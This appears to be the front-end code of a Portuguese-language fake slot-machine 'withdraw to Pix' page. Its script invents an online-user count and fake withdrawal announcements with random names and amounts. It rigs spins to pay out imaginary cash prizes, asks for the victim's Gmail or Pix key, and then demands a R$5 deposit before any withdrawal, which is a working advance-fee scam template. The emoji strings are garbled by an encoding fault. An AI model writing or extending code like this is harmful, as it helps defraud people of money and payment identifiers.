<div id="pixModal">
  <p>Informe seu Gmail ou chave Pix:</p>
  <input type="text" id="pixKey" placeholder="Digite aqui"/>
  <button id="completePixBtn" class="btn">Sacar</button>
</div>

<div class="notification" id="saqueMsg">Patrique sacou R$100</div>

<script>
const emojis=["üí∏","‚ùå","üí∞","üèÜ","ü§ë","üéâ"];
const slots=document.querySelectorAll('.slot');
const spinBtn=document.getElementById('spin');
const withdrawBtn=document.getElementById('withdraw');
const msg=document.getElementById('msg');
const ptsEl=document.getElementById('pts');
const balEl=document.getElementById('bal');
const onlineCount=document.getElementById('onlineCount');
const saqueMsg=document.getElementById('saqueMsg');
const pixModal=document.getElementById('pixModal');
const pixKeyInput=document.getElementById('pixKey');
const completePixBtn=document.getElementById('completePixBtn');
const depositBtn=document.getElementById('depositBtn');

let points=10, balance=0, depositFeito=false;

// Pessoas online aleat√≥rias
setInterval(()=>{
  const online=Math.floor(Math.random()*(430-200+1))+200;
  onlineCount.textContent=`üî¥ ${online} pessoas online`;
},3000);

// Mensagens de saque aleat√≥rias
const nomes=["Patrique","Ana","Junior","Fabr√≠cio","Matheus","J√©ssica","Felipe","Maria Clara","Lucas"];
setInterval(()=>{
  const nome=nomes[Math.floor(Math.random()*nomes.length)];
  const valor=Math.floor(Math.random()*900)+1;
  saqueMsg.textContent=`${nome} sacou R$${valor}`;
},4000);

// Bot√µes do jogo
spinBtn.onclick=()=>spinSlots();
withdrawBtn.onclick=()=>{
  if(balance<=0){ alert("Voc√™ n√£o tem saldo para sacar."); return; }
  pixModal.style.display="block";
};
pixModal.addEventListener("click",e=>{if(e.target===pixModal) pixModal.style.display="none";});

// Bot√£o sacar
completePixBtn.onclick=()=>{
  const chave=pixKeyInput.value.trim();
  if(!chave){ alert("Digite Gmail ou Pix."); return; }
  pixModal.style.display="none";
  if(depositFeito){
    alert(`Saque de R$${balance.toFixed(2)} realizado com sucesso para ${chave}!`);
    balance=0; balEl.textContent=balance.toFixed(2);
  } else {
    alert("√â necess√°rio depositar R$5 para liberar o Pix.");
  }
};

// Simular dep√≥sito PagBank liberando b√¥nus
depositBtn.onclick=()=>{
  points+=10;
  depositFeito=true;
  ptsEl.textContent=points;
  alert("Dep√≥sito confirmado! +10 pontos adicionados para jogar.");
};

function updateButtons(){
  spinBtn.disabled=points<=0;
  withdrawBtn.disabled=balance<=0;
  if(points<=0) msg.textContent="Sem pontos! Fim de jogo.";
}

function spinSlots(){
  if(points<=0) return;
  spinBtn.disabled=true;
  msg.textContent="Girando...";
  let willWin=Math.random()<0.4;
  let duration=willWin?7000:2000;
  let start=null;
  function step(ts){
    if(!start) start=ts;
    let elapsed=ts-start;
    let progress=elapsed/duration;
    let speed=willWin?15+85*(1-progress):40+100*(1-progress);
    if(!step.last || elapsed-step.last>=speed){
      slots.forEach(s=>s.textContent=emojis[Math.floor(Math.random()*emojis.length)]);
      step.last=elapsed;
    }
    if(elapsed<duration) requestAnimationFrame(step);
    else{
      let final=[];
      for(let i=0;i<9;i++){
        let emoji=willWin && i<=2?"üí∞":emojis[Math.floor(Math.random()*emojis.length)];
        slots[i].textContent=emoji; final.push(emoji);
      }
      checkResult(final);
      spinBtn.disabled=false;
    }
  }
  requestAnimationFrame(step);
}

function checkResult(arr){
  const lines=[[0,1,2],[3,4,5],[6,7,8]];
  let win=false;
  for(let [a,b,c] of lines){
    if(arr[a]===arr[b] && arr[b]===arr[c]){
      let premios=[40,50,80,100];
      let prize=premios[Math.floor(Math.random()*premios.length)];
      balance+=prize; points-=1;
      balEl.textContent=balance.toFixed(2);
      msg.textContent=`üéâ Voc√™ ganhou R$${prize}! üéâ`;
      win=true;
      break;
    }
  }
  if(!win){ points-=1; msg.textContent="Sem vit√≥ria, tente de novo.";}
  ptsEl.textContent=points;
  updateButtons();
}
</script>
